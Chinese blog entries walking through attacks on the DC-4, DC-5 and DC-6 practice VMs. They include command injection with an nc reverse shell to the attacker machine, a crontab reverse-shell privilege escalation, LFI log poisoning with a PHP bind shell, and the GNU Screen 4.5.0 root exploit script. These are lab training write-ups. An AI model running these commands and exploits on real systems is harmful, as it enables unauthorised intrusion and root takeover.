+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.0.123</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>还是没啥啊~</p>
+</li>
+<li><p>只有爆破这条路了？</p>
+</li>
+<li><p>使用了BurpSuite爆破</p>
+</li>
+<li><p>得到账号密码：<code>admin : happy</code></p>
+</li>
+<li><p>然后登陆</p>
+</li>
+<li><p>是一个执行命令的~</p>
+</li>
+<li><p>但是只有一些简单的命令</p>
+</li>
+<li><p>然后抓一个包，发现并没有对命令过滤。直接就提交了。</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /command.php HTTP/1.1</span><br><span class="line">Host: 192.168.0.123</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 22</span><br><span class="line">Origin: http://192.168.0.123</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.0.123/command.php</span><br><span class="line">Cookie: PHPSESSID=jj07s1dhaif60k528ttntgbfb3</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">radio=ls+-l&amp;submit=Run</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>我们可以修改radio的数据改成一个反弹shell的就可以</p>
+</li>
+<li><p>我们先监听8899端口 <code>nc -lvp 8899</code></p>
+</li>
+<li><p>然后把radio的数据改成：<code>nc 192.168.0.21 8899 -e /bin/bash</code></p>
+</li>
+<li><p>拿到shell就看到有有三个用户</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">charles  jim  sam</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>而且只有jim用户目录下有些东西：</p>
+</li>
+<li><pre><code>backups  mbox  test.sh
+<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">-   但是mbox无法查看</span><br><span class="line"></span><br><span class="line">-   `test.sh`也不知道有啥用</span><br><span class="line"></span><br><span class="line">-   在jim/backups目录下看到一个old-password.bak，于是就拿来爆破jim的ssh密码</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="title">    hydra -l jim -P old-passwords.bak ssh:</span>//<span class="number">192.168</span>.<span class="number">0.123</span></span><br></pre></td></tr></table></figure></code></pre></li>
+<li><p>得到密码： <code>host: 192.168.0.123   login: jim   password: jibril04</code></p>
+</li>
+<li><p>然后就是登录jim用户了 尝试进一步提权</p>
+</li>
+<li><p>这时候可以查看mbox了</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jim@dc-4:~$ cat mbox</span><br><span class="line">From root@dc-4 Sat Apr 06 20:20:04 2019</span><br><span class="line">Return-path: &lt;root@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Received: from root by dc-4 with <span class="built_in">local</span> (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-4&gt;)</span><br><span class="line">        id 1hCiQe-0000gc-EC</span><br><span class="line">        <span class="keyword">for</span> jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Test</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=<span class="string">"UTF-8"</span></span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;</span><br><span class="line">From: root &lt;root@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Status: RO</span><br><span class="line"></span><br><span class="line">This is a <span class="built_in">test</span>.</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>是邮件。一般邮件保存在<code>/var/mail</code>目录里面</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jim@dc-4:/var/mail$ cat jim</span><br><span class="line">From charles@dc-4 Sat Apr 06 21:15:46 2019</span><br><span class="line">Return-path: &lt;charles@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000</span><br><span class="line">Received: from charles by dc-4 with <span class="built_in">local</span> (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;charles@dc-4&gt;)</span><br><span class="line">        id 1hCjIX-0000kO-Qt</span><br><span class="line">        <span class="keyword">for</span> jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Holidays</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=<span class="string">"UTF-8"</span></span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;</span><br><span class="line">From: Charles &lt;charles@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">Status: O</span><br><span class="line"></span><br><span class="line">Hi Jim,</span><br><span class="line"></span><br><span class="line">I<span class="string">'m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password is:  ^xHhA&amp;hvim0y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">See ya,</span></span><br><span class="line"><span class="string">Charles</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>发现了<code>charles</code>的密码：<code>^xHhA&amp;hvim0y</code></p>
+</li>
+<li><p>我们先登录到<code>charles</code></p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su charles</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>登录之后sudo -l 发现</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">charles@dc-4:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> charles on dc-4:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User charles may run the following commands on dc-4:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/teehee</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用<code>/usr/bin/teehee</code>提权</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/teehee -a /etc/crontab */1 * * * * nc 192.168.0.21 8899 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>kali 监听8899端口，等1分钟</p>
+</li>
+<li><p>就可以获得root的shell了</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200503161102432.png" alt="flag"></p>
+</li>
+</ul>
+<h2><span id="the_end"><strong>!!!THE_END!!!</strong></span></h2><h2><span id="2-重要数据">2. 重要数据</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 网站账号密码：</span></span><br><span class="line">admin : happy</span><br><span class="line"><span class="comment"># 2. jim的ssh密码</span></span><br><span class="line">jibril04</span><br><span class="line"><span class="comment"># 3. charles的ssh密码</span></span><br><span class="line">^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>靶机渗透</category>
+      </categories>
+      <tags>
+        <tag>网络渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-5 靶机渗透</title>
+    <url>/DC-5/</url>
+    <content><![CDATA[<!-- toc -->
+
+<ul>
+<li><a href="#dc-5-靶机渗透">DC-5 靶机渗透</a><ul>
+<li><a href="#1渗透过程">1.渗透过程</a></li>
+<li><a href="#__theend__"><strong>THEEND!</strong></a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+<a id="more"></a>
+
+<h1><span id="dc-5-靶机渗透">DC-5 靶机渗透</span></h1><h2><span id="1渗透过程">1.渗透过程</span></h2><ul>
+<li>开始，扫描主机：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.0.1/24</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>找到一个 <code>192.168.0.149   00:0c:29:cb:31:5f      1      60  VMware, Inc.</code></p>
+</li>
+<li><p>扫端口：</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -A -p- 192.168.0.149</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>扫描结果：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-26 14:36 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.149</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    nginx 1.6.2</span><br><span class="line">|_http-server-header: nginx/1.6.2</span><br><span class="line">|_http-title: Welcome</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp  rpcbind</span><br><span class="line">|   100024  1          38192/tcp  status</span><br><span class="line">|_  100024  1          47477/udp  status</span><br><span class="line">38192/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br><span class="line">MAC Address: 00:0C:29:CB:31:5F (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>只有开启了 <code>80 http     111:RPC     38192:RPC</code></p>
+</li>
+<li><p>在下载的时候看到的描述:</p>
+</li>
+<li><blockquote>
+<p>  As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide some kind of idea as to what the vulnerability might involve.<br>  据我所知，只有一个可利用的入口点（也没有SSH）。这个特定的入口点可能很难识别，但它就在那里。你需要寻找一些不寻常的东西（随着页面刷新而改变的东西）。这将有希望提供一些关于脆弱性可能涉及到什么的想法。</p>
+</blockquote>
+</li>
+<li><p>我们需要寻找 &gt;&gt; <code>随着页面刷新而改变的东西</code></p>
+</li>
+<li><p>翻翻他的网页最后在 提交留言之后的页面 &gt;&gt;</p>
+</li>
+<li><p><a href="http://192.168.0.149/thankyou.php?firstname=11&amp;lastname=11&amp;country=britain&amp;subject=111" target="_blank" rel="noopener">http://192.168.0.149/thankyou.php?firstname=11&amp;lastname=11&amp;country=britain&amp;subject=111</a></p>
+</li>
+<li><p>找到他的底部的 <code>Copyright © 2019</code></p>
+</li>
+<li><p>年份会变化,那也不知道哪里有漏洞啊</p>
+</li>
+<li><p>先给他爆破个目录:</p>
+</li>
+<li><p>然后爆出来:</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">200 OK-----http://192.168.0.149//index.php</span><br><span class="line">200 OK-----http://192.168.0.149//contact.php</span><br><span class="line">200 OK-----http://192.168.0.149//faq.php</span><br><span class="line">200 OK-----http://192.168.0.149//footer.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>前面的几个都在页面上有的</p>
+</li>
+<li><p>我们去看看这个:<a href="http://192.168.0.149//footer.php" target="_blank" rel="noopener">http://192.168.0.149//footer.php</a></p>
+</li>
+<li><p>内容和<code>thankyou.php</code>的底部一样的文字</p>
+</li>
+<li><p>刷新一下年份也会变化</p>
+</li>
+<li><p>那可能就是<code>thankyou.php</code>包含了<code>footer.php</code></p>
+</li>
+<li><p>先试试 <a href="http://192.168.0.149/thankyou.php?page=footer.php" target="_blank" rel="noopener">http://192.168.0.149/thankyou.php?page=footer.php</a></p>
+</li>
+<li><p>没区别再试试<a href="http://192.168.0.149/thankyou.php?page=/etc/passwd" target="_blank" rel="noopener">http://192.168.0.149/thankyou.php?page=/etc/passwd</a></p>
+</li>
+<li><p>也没啥区别,再试试 <a href="http://192.168.0.149/thankyou.php?file=/etc/passwd" target="_blank" rel="noopener">http://192.168.0.149/thankyou.php?file=/etc/passwd</a></p>
+</li>
+<li><p>发现底部包含进来了!!!</p>
+</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span> </span><br><span class="line"><span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span> </span><br><span class="line"><span class="symbol">games:</span><span class="symbol">x:</span><span class="number">5</span><span class="symbol">:</span><span class="number">60</span><span class="symbol">:games</span><span class="symbol">:/usr/games</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">man:</span><span class="symbol">x:</span><span class="number">6</span><span class="symbol">:</span><span class="number">12</span><span class="symbol">:man</span><span class="symbol">:/var/cache/man</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">lp:</span><span class="symbol">x:</span><span class="number">7</span><span class="symbol">:</span><span class="number">7</span><span class="symbol">:lp</span><span class="symbol">:/var/spool/lpd</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">mail:</span><span class="symbol">x:</span><span class="number">8</span><span class="symbol">:</span><span class="number">8</span><span class="symbol">:mail</span><span class="symbol">:/var/mail</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">news:</span><span class="symbol">x:</span><span class="number">9</span><span class="symbol">:</span><span class="number">9</span><span class="symbol">:news</span><span class="symbol">:/var/spool/news</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">uucp:</span><span class="symbol">x:</span><span class="number">10</span><span class="symbol">:</span><span class="number">10</span><span class="symbol">:uucp</span><span class="symbol">:/var/spool/uucp</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">proxy:</span><span class="symbol">x:</span><span class="number">13</span><span class="symbol">:</span><span class="number">13</span><span class="symbol">:proxy</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line">www-<span class="symbol">data:</span><span class="symbol">x:</span><span class="number">33</span><span class="symbol">:</span><span class="number">33</span><span class="symbol">:www-data</span><span class="symbol">:/var/www</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">backup:</span><span class="symbol">x:</span><span class="number">34</span><span class="symbol">:</span><span class="number">34</span><span class="symbol">:backup</span><span class="symbol">:/var/backups</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">list:</span><span class="symbol">x:</span><span class="number">38</span><span class="symbol">:</span><span class="number">38</span><span class="symbol">:Mailing</span> List <span class="symbol">Manager:</span>/var/<span class="symbol">list:</span>/usr/sbin/nologin </span><br><span class="line"><span class="symbol">irc:</span><span class="symbol">x:</span><span class="number">39</span><span class="symbol">:</span><span class="number">39</span><span class="symbol">:ircd</span><span class="symbol">:/var/run/ircd</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">gnats:</span><span class="symbol">x:</span><span class="number">41</span><span class="symbol">:</span><span class="number">41</span><span class="symbol">:Gnats</span> Bug-Reporting System (admin)<span class="symbol">:/var/lib/gnats</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">nobody:</span><span class="symbol">x:</span><span class="number">65534</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:nobody</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line">systemd-<span class="symbol">timesync:</span><span class="symbol">x:</span><span class="number">100</span><span class="symbol">:</span><span class="number">103</span><span class="symbol">:systemd</span> Time Synchronization,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/bin/false</span></span><br><span class="line">systemd-<span class="symbol">network:</span><span class="symbol">x:</span><span class="number">101</span><span class="symbol">:</span><span class="number">104</span><span class="symbol">:systemd</span> Network </span><br><span class="line">Management,,,<span class="symbol">:/run/systemd/netif</span><span class="symbol">:/bin/false</span> </span><br><span class="line">systemd-<span class="symbol">resolve:</span><span class="symbol">x:</span><span class="number">102</span><span class="symbol">:</span><span class="number">105</span><span class="symbol">:systemd</span> Resolver,,,<span class="symbol">:/run/systemd/resolve</span><span class="symbol">:/bin/false</span> </span><br><span class="line">systemd-bus-<span class="symbol">proxy:</span><span class="symbol">x:</span><span class="number">103</span><span class="symbol">:</span><span class="number">106</span><span class="symbol">:systemd</span> Bus Proxy,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/bin/false</span> Debian-<span class="symbol">exim:</span><span class="symbol">x:</span><span class="number">104</span><span class="symbol">:</span><span class="number">109</span><span class="symbol">:</span><span class="symbol">:/var/spool/exim4</span><span class="symbol">:/bin/false</span> </span><br><span class="line"><span class="symbol">messagebus:</span><span class="symbol">x:</span><span class="number">105</span><span class="symbol">:</span><span class="number">110</span><span class="symbol">:</span><span class="symbol">:/var/run/dbus</span><span class="symbol">:/bin/false</span></span><br><span class="line"><span class="symbol">statd:</span><span class="symbol">x:</span><span class="number">106</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:</span><span class="symbol">:/var/lib/nfs</span><span class="symbol">:/bin/false</span></span><br><span class="line"><span class="symbol">sshd:</span><span class="symbol">x:</span><span class="number">107</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:</span><span class="symbol">:/var/run/sshd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">dc:</span><span class="symbol">x:</span><span class="number">1000</span><span class="symbol">:</span><span class="number">1000</span><span class="symbol">:dc</span>,,,<span class="symbol">:/home/dc</span><span class="symbol">:/bin/bash</span> <span class="symbol">mysql:</span><span class="symbol">x:</span><span class="number">108</span><span class="symbol">:</span><span class="number">113</span><span class="symbol">:MySQL</span></span><br><span class="line">Server,,,<span class="symbol">:/nonexistent</span><span class="symbol">:/bin/false</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>有<code>本地文件包含漏洞(LFI)</code> 好办了 ^_^</p>
+</li>
+<li><p>我们试试日志注入:</p>
+</li>
+<li><p>前面 <code>nmap</code> 扫出web服务器是 <code>nginx 1.6.2</code></p>
+</li>
+<li><p>然后 nginx默认的访问日志在: <code>/var/log/nginx/access.log</code></p>
+</li>
+<li><p>直接输入: <a href="http://192.168.0.149/thankyou.php?file=/var/log/nginx/access.log" target="_blank" rel="noopener">http://192.168.0.149/thankyou.php?file=/var/log/nginx/access.log</a> 验证一下</p>
+</li>
+<li><p>真包含进来了~ <strong>(ps:前面的爆破会产生大量日志内容,可能导致读不出内容,建议在爆破之前给靶机来个快照)</strong></p>
+</li>
+<li><p>我们直接用nc去连接他的80端口:</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/workspace<span class="comment"># nc 192.168.0.149 80</span></span><br><span class="line"><span class="comment">#直接写一个直连的shellcode</span></span><br><span class="line">GET &lt;?php system(<span class="string">'nc -lvp 13123 -e /bin/bash'</span>);?&gt; HTTP/1.1</span><br><span class="line"><span class="comment">#下面的自己生成的</span></span><br><span class="line">HTTP/1.1 400 Bad Request</span><br><span class="line">Server: nginx/1.6.2</span><br><span class="line">Date: Sat, 25 Apr 2020 17:33:49 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 172</span><br><span class="line">Connection: close</span><br><span class="line"><span class="comment"># 返回信息:</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=<span class="string">"white"</span>&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx/1.6.2&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>然后我们再访问:<a href="http://192.168.0.149/thankyou.php?file=/var/log/nginx/access.log" target="_blank" rel="noopener">http://192.168.0.149/thankyou.php?file=/var/log/nginx/access.log</a></p>
+</li>
+<li><p>这时候会一直加载出不来页面就说明成功了</p>
+</li>
+<li><p>服务器就会开启监听 <code>13123</code> 端口 ,直接用<code>nc 192.168.0.149 13123</code> 就可以得到shell 了</p>
+</li>
+<li><p>得到shell了 再让他来个标准控制台</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>得到标准控制台之后 就要想办法提权了</p>
+</li>
+<li><p>先看看用户目录,发现只有一个<code>dc</code> 用户有用户目录</p>
+</li>
+<li><p>里面啥也没有 再翻翻 <code>/tmp</code> 文件夹 也没</p>
+</li>
+<li><p>先看看suid 的提权 </p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>找出suid的文件</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/screen-4.5.0</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/sbin/mount.nfs</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>百度才知道 :<code>screen-4.5.0</code> 有一个提权漏洞</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali<span class="comment"># searchsploit screen 4.5.0</span></span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation  </span><br><span class="line">| exploits/linux/<span class="built_in">local</span>/41154.sh                                                                        </span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation (PoC)  </span><br><span class="line">| exploits/linux/<span class="built_in">local</span>/41152.txt</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>找到两个文件 直接用那个sh文件吧</p>
+</li>
+<li><p>可以到自己的kali 运行一下,会产生两个文件并获得<code>rootshell</code></p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-rwxr-xr-x 1 root root  1152 4月  26 15:57 41154.sh</span><br><span class="line">-rwxr-xr-x 1 root root 16136 4月  26 15:57 libhax.so</span><br><span class="line">-rwxr-xr-x 1 root root 16824 4月  26 15:57 rootshell</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>然后我们用kali写一个sh文件: <code>vim /tmp/run.sh</code></p>
+</li>
+<li><p>内容是:</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">"\x0a/tmp/libhax.so"</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Triggering..."</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>我们用 scp 拷贝到靶机里去</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp root@192.168.0.21:/tmp/libhax.so /tmp</span><br><span class="line"><span class="comment">#然后输入kali的密码</span></span><br><span class="line">scp root@192.168.0.21:/tmp/rootshell /tmp</span><br><span class="line"><span class="comment">#然后输入kali的密码</span></span><br><span class="line">scp root@192.168.0.21:/tmp/run.sh /tmp</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>然后依次执行下面的语句或者写成shell脚本</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">"\x0a/tmp/libhax.so"</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Triggering..."</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>给他个执行权限并运行 <code>cd /tmp;chmod +x run.sh;./run.sh</code></p>
+</li>
+<li><p>就可以得到一个<code>rootshell</code>了:</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-5:~$ <span class="built_in">cd</span> /tmp;chmod +x run.sh;./run.sh</span><br><span class="line"><span class="built_in">cd</span> /tmp;chmod +x run.sh;./run.sh</span><br><span class="line">[+] Triggering...</span><br><span class="line"><span class="string">' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span></span><br><span class="line"><span class="string">[+] done!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>flag 就在<code>/root</code>下的<code>thisistheflag.txt</code>文件</li>
+</ul>
+<h2><span id="theend"><strong>THEEND!</strong></span></h2>]]></content>
+      <categories>
+        <category>靶机渗透</category>
+      </categories>
+      <tags>
+        <tag>网络渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-6 靶机渗透</title>
+    <url>/DC-6/</url>
+    <content><![CDATA[<!-- toc -->
+
+<ul>
+<li><a href="#dc-6靶机渗透">DC-6靶机渗透</a><ul>
+<li><a href="#1渗透过程">1.渗透过程</a></li>
+<li><a href="#2-重要信息">2. 重要信息:</a></li>
+<li><a href="#__~the~end~__"><strong><del>THE</del>END~</strong></a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+<a id="more"></a>
+
+<h1><span id="dc-6靶机渗透">DC-6靶机渗透</span></h1><h2><span id="1渗透过程">1.渗透过程</span></h2><ul>
+<li><p>写在前面：</p>
+</li>
+<li><p>靶机介绍内容提取：</p>
+</li>
+<li><blockquote>
+<p>  <strong>NOTE</strong>: You WILL need to edit your hosts file on your pentesting device so that it reads something like:</p>
+<p>  192.168.0.142        wordy<br>  <strong>NOTE</strong>: I’ve used 192.168.0.142 as an example. You’ll need to use your normal method to determine the IP address of the VM, and adapt accordingly.</p>
+<p>  <strong>注意</strong>：您需要在pentesting设备上编辑主机文件，使其读取如下内容：</p>
+<p>  192.168.0.142        wordy</p>
+<p>  <strong>注</strong>：我以192.168.0.142为例。您需要使用常规方法来确定VM的IP地址，并相应地进行调整。</p>
+<p>  <strong>Clue</strong><br>  OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job.</p>
+<p>  <code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</code><br>  That should save you a few years. ;-)</p>
+<p>  <strong>线索</strong></p>
+<p>  好吧，这并不是一个真正的线索，但更多的是一些“我们不想花五年时间等待某个过程完成”之类的建议，给那些只想继续工作的人。</p>
